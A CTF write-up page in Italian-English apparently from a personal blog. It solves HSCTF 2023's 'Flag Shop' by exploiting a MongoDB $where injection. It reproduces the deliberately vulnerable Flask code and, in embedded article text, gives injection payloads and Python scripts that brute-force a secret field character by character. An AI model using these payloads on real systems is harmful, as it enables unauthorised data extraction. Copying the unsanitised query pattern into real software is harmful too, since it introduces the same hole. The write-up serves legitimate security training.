<!DOCTYPE html>
<html lang="it" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Flag Shop - HSCTF 2023 | Tiziano Caruana</title>
<meta name="keywords" content="writeup, CTFs, hsctf-2023">
<meta name="description" content="Building a custom Python payload to exploit a server-side JavaScript injection vulnerability">
<meta name="author" content="">
<link rel="canonical" href="http://tiziano-caruana.github.io/it/posts/writeups/hsctf-2023/flagshop_hsctf/">
<meta name="google-site-verification" content="-NRlyU37XYTZJ4WyeO8svRuXL8xXbOUAqLrx-qYbEpw">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ&amp;usqp=CAU">
<link rel="icon" type="image/png" sizes="16x16" href="http://tiziano-caruana.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://tiziano-caruana.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://tiziano-caruana.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="http://tiziano-caruana.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://tiziano-caruana.github.io/posts/writeups/hsctf-2023/flagshop_hsctf/">
<link rel="alternate" hreflang="it" href="http://tiziano-caruana.github.io/it/posts/writeups/hsctf-2023/flagshop_hsctf/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Flag Shop - HSCTF 2023" />
<meta property="og:description" content="Building a custom Python payload to exploit a server-side JavaScript injection vulnerability" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://tiziano-caruana.github.io/it/posts/writeups/hsctf-2023/flagshop_hsctf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-14T22:20:00+02:00" />
<meta property="article:modified_time" content="2023-07-14T22:20:00+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Flag Shop - HSCTF 2023"/>
<meta name="twitter:description" content="Building a custom Python payload to exploit a server-side JavaScript injection vulnerability"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://tiziano-caruana.github.io/it/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Flag Shop - HSCTF 2023",
      "item": "http://tiziano-caruana.github.io/it/posts/writeups/hsctf-2023/flagshop_hsctf/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Flag Shop - HSCTF 2023",
  "name": "Flag Shop - HSCTF 2023",
  "description": "Building a custom Python payload to exploit a server-side JavaScript injection vulnerability",
  "keywords": [
    "writeup", "CTFs", "hsctf-2023"
  ],
  "articleBody": "Versione italiana non ancora disponibile. Data di pubblicazione prevista: 16 luglio June 2023 - Blind NoSQL injection\n“hsctf pay to win confirmed?”\nPrior knowledge: basic web-related knowledge, Burpsuite\nContext We are provided with the link to the website and its corresponding source code. The website appears to be very simple, and the source code is quite short:\nContent of app.py:\nimport os import traceback import pymongo.errors from flask import Flask, jsonify, render_template, request from pymongo import MongoClient app = Flask(__name__) FLAG = os.getenv(\"FLAG\") app.config[\"SECRET_KEY\"] = os.getenv(\"FLASK_SECRET\") mongo_client = MongoClient(connect=False) db = mongo_client.database @app.route(\"/\") def main(): return render_template(\"index.html\") @app.route(\"/api/search\", methods=[\"POST\"]) def search(): if request.json is None or \"search\" not in request.json: return jsonify({\"error\": \"No search provided\", \"results\": []}), 400 try: results = db.flags.find( { \"$where\": f\"this.challenge.includes('{request.json['search']}')\" }, { \"_id\": False, \"flag\": False } ).sort(\"challenge\") except pymongo.errors.PyMongoError: traceback.print_exc() return jsonify({\"error\": \"Database error\", \"results\": []}), 500 return jsonify({\"error\": \"\", \"results\": list(results)}), 200 if __name__ == \"__main__\": app.run() So we know that the website uses MongoDB as its (NoSQL) database.\nindex.html and index.css don’t contain anything interesting, while index.js helps us understand that the buttons are useless and that api/search is the endpoint path used to make the POST request for the search.\nContent of index.js:\nconst search_form = document.getElementById(\"search-form\"); const search_input = document.getElementById(\"search\"); const items = document.getElementById(\"items\"); search_form.addEventListener(\"submit\", function (event) { event.preventDefault(); search(search_input.value); }); async function search(val) { let resp = await fetch(\"/api/search\", { method: \"POST\", headers: { \"Content-Type\": \"application/json\", }, body: JSON.stringify({ search: val }), }); let { error, results } = await resp.json(); if (error) { items.textContent = error; return; } items.innerHTML = \"\"; for (let { challenge, price } of results) { let row = document.createElement(\"tr\"); let chall_cell = document.createElement(\"td\"); chall_cell.textContent = challenge; let price_cell = document.createElement(\"td\"); price_cell.textContent = `$${price}.00`; let buy_cell = document.createElement(\"td\"); let buy_button = document.createElement(\"button\"); buy_button.textContent = \"Buy Flag\"; buy_button.addEventListener(\"click\", function () { alert(\"Not implemented yet!\"); }); buy_cell.append(buy_button); row.append(chall_cell, price_cell, buy_cell); items.append(row); } } search(\"\"); Nothing that we couldn’t have discovered by playing around with the website.\nPlaying around A quick analysis of the code would have been enough to understand where the vulnerability lies, but my teammate and I decided to bombard the search field. Everything seems to be working correctly, and searching with an empty textfield returns all results.\nThe payloads from the PayloadsAllTheThings repository are mostly used for login bypass, while the SSJI payloads don’t seem to do anything.\nWhen we send 0;return true, no result is displayed, while with ';return 'a'=='a' \u0026\u0026 ''==', the previous query result remains (unexpected behavior, it should give us either a different result or an error).\nStupidly, we didn’t take a look at the logs, but this is what happened if a 500 error code was obtained. Perfect! I only understood this after trying to send the payload to the api/search endpoint with Burp Repeater. We now know for sure that the vulnerability lies in the definition of the query.\n@app.route(\"/api/search\", methods=[\"POST\"]) def search(): if request.json is None or \"search\" not in request.json: return jsonify({\"error\": \"No search provided\", \"results\": []}), 400 try: results = db.flags.find( { \"$where\": f\"this.challenge.includes('{request.json['search']}')\" }, { \"_id\": False, \"flag\": False } ).sort(\"challenge\") except pymongo.errors.PyMongoError: traceback.print_exc() return jsonify({\"error\": \"Database error\", \"results\": []}), 500 return jsonify({\"error\": \"\", \"results\": list(results)}), 200 The if statement and error handling are normal. The only line to analyze is the $where clause.\nExploiting the vulnerability (extended thought process) The input is directly inserted with an f-string with 0 sanitization. Referring to the MongoDB $where clause documentation, we read:\nUse the $where operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system.\nIt could be intuitively understood by reading the content of db.flags.find() that the $where clause executes any JavaScript code passed to it.\nAt this point, I copied the JS code to a code editor. When I have challenges like this, to make things easier for me, I copy the string and try to construct a very simple payload without moving the cursor.\nWith '); we escaped the string and closed the statement, giving us an SSJI. All that’s left is to get rid of the extra ')' at the end. I wasn’t able to do this (and I don’t think it was possible, but it certainly wasn’t necessary) since I couldn’t use comments. So, I went full monkey mode and just copied the previous function, forming a first test payload:\n'); this.challenge.includes(', interpreted as this.challenge.includes(''); this.challenge.includes('') by the program. The output is what we expected and desired, which is to return all results (like a ' OR 1=1).\nBy testing or reading the documentation, we can discover that this happens because only the last valid condition is computed by the $where clause. This means that we can write anything in the first include, since it won’t be interpreted (something'); this.challenge.includes('):\nWhile the second one is interpreted (something'); this.challenge.includes('search):\nSo we have the vulnerability, but we cannot directly retrieve the flag since it is excluded from the query (if you’re not sure, please reread the source code). I then tried a payload with a boolean operator (something'); always_true() || this.challenge.includes('something):\nThis is very useful for searching for a potential attack. We can perform a conditional check on the flag using \u0026\u0026 this.challenge.includes('flag') to only get results from the flag-shop entity. We can do a first test with the flag format (something'); this.flag.includes('flag{') \u0026\u0026 this.challenge.includes('flag): We will have to take advantage of this behavior, performing a small brute force to reconstruct the flag character by character. We can now start to construct our payload.\nFinal payload Payload used during the CTF import requests import urllib3 import string import urllib import time import json urllib3.disable_warnings() url = \"http://flag-shop.hsctf.com/api/search\" headers={'content-type': 'application/json'} flag = \"flag{\" search = f\"kj'); this.flag.includes('{flag}') \u0026\u0026 this.challenge.includes('flag\" while True: for c in string.printable: try: print(c) if c not in ['*','+','.','?','|','\u0026','$', '\"', \"'\", \"\\\\\", \"|\", \"/\"]: search = f\"kj'); this.flag.includes('{flag + c}') \u0026\u0026 this.challenge.includes('flag\" payload = '{\"search\": \"%s\"}' % (search) print(\"connecting to CTF platform...\") r = requests.post(url, data = payload, headers=headers, timeout=10) #print(payload) result = json.loads(r.text) print(result[\"results\"]) if bool(result[\"results\"]): print(\"Found one more char : %s\" % (flag+c)) flag += c except: continue Final payload import requests import urllib3 import string import json urllib3.disable_warnings() url = \"http://flag-shop.hsctf.com/api/search\" headers={'content-type': 'application/json'} flag = \"flag{\" search = f\"kj'); this.flag.includes('{flag}') \u0026\u0026 this.challenge.includes('flag\" while True: for c in string.printable: try: if c not in ['*','+','.','?','|','\u0026','$', '\"', \"'\", \"\\\\\", \"|\", \"/\"]: search = f\"kj'); this.flag.includes('{flag + c}') \u0026\u0026 this.challenge.includes('flag\" payload = '{\"search\": \"%s\"}' % (search) r = requests.post(url, data = payload, headers=headers, timeout=10) result = json.loads(r.text) if bool(result[\"results\"]): print(\"Found one more char : %s\" % (flag+c)) flag += c except: continue As you can see, the only difference is that the first payload has more print statements.\nThis is because, due to the nature of the challenge and the fact that many others were also brute-forcing, the infrastructure became unresponsive for a few seconds, causing exceptions or blocking the request indefinitely.\nThe ‘print’ statements were only used for debugging (which is unnecessary when the infrastructure is not being bombarded), and in the second payload, I only left those related to the flag search.\nif c not in ['*','+','.','?','|','\u0026','$', '\"', \"'\", \"\\\\\", \"|\", \"/\"] is used to exclude characters that can cause problems with the payload string or the server, while the try/except is used to avoid losing progress in case of an error.\nIt was also very useful during the competition because CTRL-C moves on to the next character instead of closing the program.\nThis way, in case the program got stuck (which happened about ten times during the competition, but not at all when I tried it on the post-competition infrastructure), I would only skip one character instead of having to start over and retrieve the last characters manually.\nIn this case, I found a very simple blind NoSQL injection, but it is a good challenge if you are new to building custom payloads or have never encountered a blind NoSQL vulnerability before.\nThank you for reading until the end! I am happy to accept any questions or feedback.\n",
  "wordCount" : "1340",
  "inLanguage": "it",
  "datePublished": "2023-07-14T22:20:00+02:00",
  "dateModified": "2023-07-14T22:20:00+02:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://tiziano-caruana.github.io/it/posts/writeups/hsctf-2023/flagshop_hsctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Tiziano Caruana",
    "logo": {
      "@type": "ImageObject",
      "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ\u0026usqp=CAU"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://tiziano-caruana.github.io/it/" accesskey="h" title="Tiziano Caruana (Alt + H)">Tiziano Caruana</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="http://tiziano-caruana.github.io/" title="English"
                            aria-label="English">English</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://tiziano-caruana.github.io/it/about_me" title="Chi sono">
                    <span>Chi sono</span>
                </a>
            </li>
            <li>
                <a href="http://tiziano-caruana.github.io/it/tags/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="http://tiziano-caruana.github.io/it/tags/writeup" title="Writeup">
                    <span>Writeup</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://tiziano-caruana.github.io/it/">Home</a>&nbsp;»&nbsp;<a href="http://tiziano-caruana.github.io/it/posts/">Posts</a></div>
    <h1 class="post-title">
      Flag Shop - HSCTF 2023
    </h1>
    <div class="post-description">
      Building a custom Python payload to exploit a server-side JavaScript injection vulnerability
    </div>
    <div class="post-meta">&lt;span title=&#39;2023-07-14 22:20:00 &#43;0200 CEST&#39;&gt;luglio 14, 2023&lt;/span&gt;&amp;nbsp;·&amp;nbsp;7 minuti&amp;nbsp;·&amp;nbsp;1340 parole&nbsp;|&nbsp;Traduzioni:
<ul class="i18n_list">
    <li>
        <a href="http://tiziano-caruana.github.io/posts/writeups/hsctf-2023/flagshop_hsctf/">English</a>
    </li>
</ul>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Indice contenuti</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#versione-italiana-non-ancora-disponibile-data-di-pubblicazione-prevista-16-luglio" aria-label="Versione italiana non ancora disponibile. Data di pubblicazione prevista: 16 luglio">Versione italiana non ancora disponibile. Data di pubblicazione prevista: 16 luglio</a><ul>
                        
                <li>
                    <a href="#context" aria-label="Context">Context</a></li>
                <li>
                    <a href="#playing-around" aria-label="Playing around">Playing around</a></li>
                <li>
                    <a href="#exploiting-the-vulnerability-extended-thought-process" aria-label="Exploiting the vulnerability (extended thought process)">Exploiting the vulnerability (extended thought process)</a></li>
                <li>
                    <a href="#final-payload" aria-label="Final payload">Final payload</a><ul>
                        
                <li>
                    <a href="#payload-used-during-the-ctf" aria-label="Payload used during the CTF">Payload used during the CTF</a></li>
                <li>
                    <a href="#final-payload-1" aria-label="Final payload">Final payload</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="versione-italiana-non-ancora-disponibile-data-di-pubblicazione-prevista-16-luglio">Versione italiana non ancora disponibile. Data di pubblicazione prevista: 16 luglio<a hidden class="anchor" aria-hidden="true" href="#versione-italiana-non-ancora-disponibile-data-di-pubblicazione-prevista-16-luglio">#</a></h1>
<p><strong>June 2023 - Blind NoSQL injection</strong></p>
<blockquote>
<p>“hsctf pay to win confirmed?”</p>
</blockquote>
<p><strong>Prior knowledge: basic web-related knowledge, Burpsuite</strong></p>
<h2 id="context">Context<a hidden class="anchor" aria-hidden="true" href="#context">#</a></h2>
<p>We are provided with the link to the website and its corresponding source code.
The website appears to be very simple, and the source code is quite short:</p>
<p><img loading="lazy" src="/writeups/flagshop_hsctf/FlagShopHome.png" alt="Screenshot showing the Flag Shop homepage with search bar and table"  />
</p>
<p>Content of <code>app.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> traceback
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pymongo.errors
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, jsonify, render_template, request
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pymongo <span style="color:#f92672">import</span> MongoClient
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;FLASK_SECRET&#34;</span>)
</span></span><span style="display:flex;"><span>mongo_client <span style="color:#f92672">=</span> MongoClient(connect<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> mongo_client<span style="color:#f92672">.</span>database
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/search&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>json <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>json:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;No search provided&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: []}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		results <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>flags<span style="color:#f92672">.</span>find(
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;$where&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this.challenge.includes(&#39;</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;search&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>			}, {
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;_id&#34;</span>: <span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;flag&#34;</span>: <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		)<span style="color:#f92672">.</span>sort(<span style="color:#e6db74">&#34;challenge&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> pymongo<span style="color:#f92672">.</span>errors<span style="color:#f92672">.</span>PyMongoError:
</span></span><span style="display:flex;"><span>		traceback<span style="color:#f92672">.</span>print_exc()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Database error&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: []}), <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: list(results)}), <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>So we know that the website uses MongoDB as its <!-- raw HTML omitted -->(NoSQL)<!-- raw HTML omitted --> database.</p>
<p><code>index.html</code> and <code>index.css</code> don&rsquo;t contain anything interesting, while <code>index.js</code> helps us understand that the buttons are useless and that <code>api/search</code> is the endpoint path used to make the POST request for the search.</p>
<p>Content of <code>index.js</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">search_form</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;search-form&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">search_input</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;search&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">items</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;items&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">search_form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">preventDefault</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">search</span>(<span style="color:#a6e22e">search_input</span>.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">search</span>(<span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/search&#34;</span>, {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>,
</span></span><span style="display:flex;"><span>		},
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">val</span> }),
</span></span><span style="display:flex;"><span>	});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">results</span> } <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">json</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">items</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">error</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">items</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">challenge</span>, <span style="color:#a6e22e">price</span> } <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">results</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">row</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;tr&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chall_cell</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;td&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">chall_cell</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">challenge</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">price_cell</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;td&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">price_cell</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`$</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">price</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.00`</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buy_cell</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;td&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buy_button</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;button&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buy_button</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Buy Flag&#34;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buy_button</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;click&#34;</span>, <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Not implemented yet!&#34;</span>);
</span></span><span style="display:flex;"><span>		});
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buy_cell</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">buy_button</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">row</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">chall_cell</span>, <span style="color:#a6e22e">price_cell</span>, <span style="color:#a6e22e">buy_cell</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">items</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">row</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">search</span>(<span style="color:#e6db74">&#34;&#34;</span>);
